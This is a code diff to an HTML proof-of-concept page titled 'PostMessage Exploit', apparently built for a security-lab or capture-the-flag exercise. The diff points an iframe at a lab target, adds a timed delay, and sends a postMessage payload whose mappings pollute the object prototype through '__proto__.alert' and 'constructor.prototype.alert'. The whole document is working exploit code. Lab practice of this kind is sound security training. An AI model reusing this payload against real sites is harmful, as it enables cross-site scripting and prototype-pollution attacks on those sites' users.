@@ -4,32 +4,38 @@
     <title>Exploit</title>
 </head>
 <body>
-    <h1>PostMessage Exploit</h1>
+    <h1>PostMessage Exploit - Loading...</h1>
 
-    <iframe id="target" src="https://www.turb0.one/files/9187cc52-fd4d-49c6-a336-0ce8b5139394/xsschal2minimal/outer.html" width="800" height="600"></iframe>
+    <iframe id="target" src="https://0a1200680479a300806f03dd00b400b0.web-security-academy.net/inner.html" width="900" height="600"></iframe>
 
     <script>
         const iframe = document.getElementById('target');
 
         iframe.onload = function() {
-            iframe.contentWindow.postMessage({
-                base: {
-                    reqBody: {}
-                },
-                metadata: {
-                    id: "350f61be-feea-424b-851b-f4e09bda7b7f"
-                },
-                mappings: [
-                    {
-                        from: "__proto__.alert",           // Prototype Pollution
-                        to: "test"
+            console.log("Iframe loaded, sending payload in 1 second...");
+
+            setTimeout(() => {
+                iframe.contentWindow.postMessage({
+                    base: {
+                        reqBody: {}
                     },
-                    {
-                        from: "constructor.prototype.alert",
-                        to: "test2"
-                    }
-                ]
-            }, "*");
+                    metadata: {
+                        id: "350f61be-feea-424b-851b-f4e09bda7b7f"
+                    },
+                    mappings: [
+                        {
+                            from: "__proto__.alert",           // Prototype Pollution
+                            to: "test"
+                        },
+                        {
+                            from: "constructor.prototype.alert",
+                            to: "test2"
+                        }
+                    ]
+                }, "*");
+
+                console.log("Payload sent!");
+            }, 1500); // Delay 1.5 detik
         };
     </script>
 </body>
